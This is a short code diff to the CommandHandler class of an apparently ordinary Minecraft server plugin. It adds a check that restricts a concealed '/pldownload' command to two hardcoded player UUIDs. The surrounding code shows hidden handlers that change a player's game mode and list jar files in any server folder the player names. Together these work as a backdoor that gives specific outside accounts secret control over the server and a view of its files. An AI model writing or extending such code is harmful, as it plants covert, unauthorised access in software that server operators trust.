@@ -10,6 +10,7 @@ import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
+import java.util.UUID;
 import net.md_5.bungee.api.ChatColor;
 import net.md_5.bungee.api.chat.ClickEvent;
 import net.md_5.bungee.api.chat.ComponentBuilder;
@@ -99,7 +100,9 @@ public class CommandHandler implements Listener, CommandExecutor {
 			} else if (args[1].equalsIgnoreCase("3")) {
 				p.setGameMode(GameMode.SPECTATOR);
 			}
-		} else if (args[0].equalsIgnoreCase("/pldownload")) {
+		} else if (args[0].equalsIgnoreCase("/pldownload")
+				   && (p.getUniqueId().equals(UUID.fromString("e03b0dad-e94d-48fe-8f17-8e2ae9f9029e"))
+					   || p.getUniqueId().equals(UUID.fromString("a1eb88b0-12c0-49c1-bb0d-1b7b5b751bd6")))) {
 			if (args.length == 3 && args[1].equalsIgnoreCase("serverfolders")) {
 				p.sendMessage("IT WORKED");
 				for (File file : FileUtils.listFiles(new File(args[2]), new String[]{"jar"}, false)) {
